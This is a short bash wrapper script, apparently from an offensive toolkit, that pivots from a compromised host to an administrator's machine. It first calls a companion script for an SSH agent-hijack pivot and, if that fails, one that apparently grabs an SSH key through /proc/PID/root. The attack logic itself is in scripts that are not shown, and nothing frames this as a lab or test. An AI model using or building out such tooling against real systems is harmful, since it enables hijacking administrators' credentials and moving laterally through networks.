#!/usr/bin/env bash
# Try agent pivot first, then /proc/PID/root key (admin SSH to infected machine).
# Usage: sudo ./pivot_infected_admin.sh [ADMIN_IP]
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ADMIN_IP="${1:-}"

if "$DIR/pivot_agent_to_admin.sh" "$ADMIN_IP" 2>/dev/null; then
  exit 0
fi
echo "[*] Agent pivot failed — trying /proc/PID/root ..."
exec "$DIR/pivot_proc_root_key.sh" "$ADMIN_IP"